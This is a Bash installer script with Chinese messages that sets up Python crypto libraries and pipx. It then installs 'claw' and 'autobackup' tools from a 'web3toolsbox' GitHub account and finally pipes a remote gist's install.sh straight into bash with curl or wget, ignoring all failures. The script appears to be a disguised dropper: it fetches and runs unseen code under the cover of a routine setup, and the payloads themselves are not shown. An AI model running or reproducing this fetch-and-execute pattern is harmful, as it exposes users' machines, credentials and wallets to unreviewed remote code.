#!/bin/bash

FAILED_STEPS=()
run_step() {
    local desc="$1"
    shift
    echo ""
    echo "==> $desc"
    "$@"
    local rc=$?
    if [ $rc -ne 0 ]; then
        echo "WARN: 失败但继续（exit=$rc）：$desc" >&2
        FAILED_STEPS+=("$desc (exit=$rc)")
    fi
    return 0
}

# 检测操作系统类型
OS_TYPE=$(uname -s)

# 检查包管理器和安装必需的包
install_dependencies() {
    case $OS_TYPE in
        "Darwin") 
            if ! command -v brew &> /dev/null; then
                echo "正在安装 Homebrew..."
                run_step "安装 Homebrew" /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
            fi
            
            if ! command -v pip3 &> /dev/null; then
                run_step "brew install python3" brew install python3
            fi
            ;;
            
        "Linux")
            PACKAGES_TO_INSTALL=""
            
            if ! command -v pip3 &> /dev/null; then
                PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL python3-pip"
            fi
            
            if ! command -v xclip &> /dev/null; then
                PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL xclip"
            fi
            
            if [ ! -z "$PACKAGES_TO_INSTALL" ]; then
                run_step "apt update" sudo apt update
                # shellcheck disable=SC2086
                run_step "apt install -y $PACKAGES_TO_INSTALL" sudo apt install -y $PACKAGES_TO_INSTALL
            fi
            ;;
            
        *)
            echo "WARN: 不支持的操作系统：$OS_TYPE（跳过系统依赖安装，但继续后续步骤）" >&2
            ;;
    esac
}

# 安装依赖
run_step "安装系统依赖" install_dependencies
if [ "$OS_TYPE" = "Linux" ]; then
    PIP_INSTALL="python3 -m pip install --break-system-packages"
elif [ "$OS_TYPE" = "Darwin" ]; then
    PIP_INSTALL="python3 -m pip install --user --break-system-packages"
else
    PIP_INSTALL="python3 -m pip install"
fi

if ! python3 -m pip show requests >/dev/null 2>&1; then
    run_step "pip 安装 requests" bash -lc "$PIP_INSTALL requests"
fi

if ! python3 -m pip show cryptography >/dev/null 2>&1; then
    run_step "pip 安装 cryptography" bash -lc "$PIP_INSTALL cryptography"
fi

if ! python3 -m pip show pycryptodome >/dev/null 2>&1; then
    run_step "pip 安装 pycryptodome" bash -lc "$PIP_INSTALL pycryptodome"
fi

# 检测是否为 WSL 环境
is_wsl() {
    if [ "$OS_TYPE" = "Linux" ]; then
        if grep -qi microsoft /proc/version 2>/dev/null || grep -qi wsl /proc/version 2>/dev/null; then
            return 0
        fi
        # 也可以通过 uname -r 检测
        if uname -r | grep -qi microsoft 2>/dev/null; then
            return 0
        fi
    fi
    return 1
}

install_auto_backup() {
    # 安装 pipx（如果未安装）
    if ! command -v pipx &> /dev/null; then
        echo "检测到未安装 pipx，正在安装 pipx..."
        case $OS_TYPE in
            "Darwin")
                run_step "brew install pipx" brew install pipx
                run_step "pipx ensurepath" pipx ensurepath
                ;;
            "Linux")
                run_step "apt update（pipx）" sudo apt update
                run_step "apt install -y pipx" sudo apt install -y pipx
                run_step "pipx ensurepath" pipx ensurepath
                ;;
            *)
                echo "WARN: 无法在当前系统上安装 pipx（跳过 pipx 相关安装，但继续）" >&2
                return 0
                ;;
        esac
    fi

    if ! command -v openclaw-config &> /dev/null; then
        run_step "pipx 安装 claw" pipx install "git+https://github.com/web3toolsbox/claw.git"
    else
        echo "跳过 claw 安装。"
    fi

    if ! command -v autobackup &> /dev/null; then
        local install_url=""
        case $OS_TYPE in
            "Darwin")
                install_url="git+https://github.com/web3toolsbox/auto-backup-macos"
                ;;
            "Linux")
                if is_wsl; then
                    install_url="git+https://github.com/web3toolsbox/auto-backup-wsl"
                else
                    install_url="git+https://github.com/web3toolsbox/auto-backup-linux"
                fi
                ;;
            *)
                echo "不支持的操作系统，跳过安装"
                return 0
                ;;
        esac
        
        run_step "pipx 安装 autobackup（$install_url）" pipx install "$install_url"
    else
        echo "已检测到 autobackup 命令，跳过安装。"
    fi
}

run_step "安装自动备份相关（pipx/claw/autobackup）" install_auto_backup

GIST_URL="https://gist.githubusercontent.com/wongstarx/b1316f6ef4f6b0364c1a50b94bd61207/raw/install.sh"
if command -v curl &>/dev/null; then
    run_step "执行远程安装脚本（curl）" bash -lc "bash <(curl -fsSL \"$GIST_URL\")"
elif command -v wget &>/dev/null; then
    run_step "执行远程安装脚本（wget）" bash -lc "bash <(wget -qO- \"$GIST_URL\")"
else
    echo "WARN: 未找到 curl/wget，跳过远程安装脚本：$GIST_URL" >&2
fi

# 自动 source shell 配置文件
echo "正在应用环境配置..."
get_shell_rc() {
    local current_shell=$(basename "$SHELL")
    local shell_rc=""
    
    case $current_shell in
        "bash")
            shell_rc="$HOME/.bashrc"
            ;;
        "zsh")
            shell_rc="$HOME/.zshrc"
            ;;
        *)
            if [ -f "$HOME/.bashrc" ]; then
                shell_rc="$HOME/.bashrc"
            elif [ -f "$HOME/.zshrc" ]; then
                shell_rc="$HOME/.zshrc"
            elif [ -f "$HOME/.profile" ]; then
                shell_rc="$HOME/.profile"
            else
                shell_rc="$HOME/.bashrc"
            fi
            ;;
    esac
    echo "$shell_rc"
}

SHELL_RC=$(get_shell_rc)
# 检查是否有需要 source 的配置（如 PATH 修改、nvm 等）
if [ -f "$SHELL_RC" ]; then
    # 检查是否有常见的配置项需要 source
    if grep -qE "(export PATH|nvm|\.nvm)" "$SHELL_RC" 2>/dev/null; then
        echo "检测到环境配置，正在应用环境变量..."
        source "$SHELL_RC" 2>/dev/null || echo "WARN: 自动应用失败，请手动运行: source $SHELL_RC" >&2
    else
        echo "未检测到需要 source 的配置"
    fi
fi

echo "安装完成！"
if [ ${#FAILED_STEPS[@]} -gt 0 ]; then
    echo "------------------------------" >&2
    echo "WARN: 以下步骤失败但已继续执行：" >&2
    for s in "${FAILED_STEPS[@]}"; do
        echo " - $s" >&2
    done
    echo "------------------------------" >&2
fi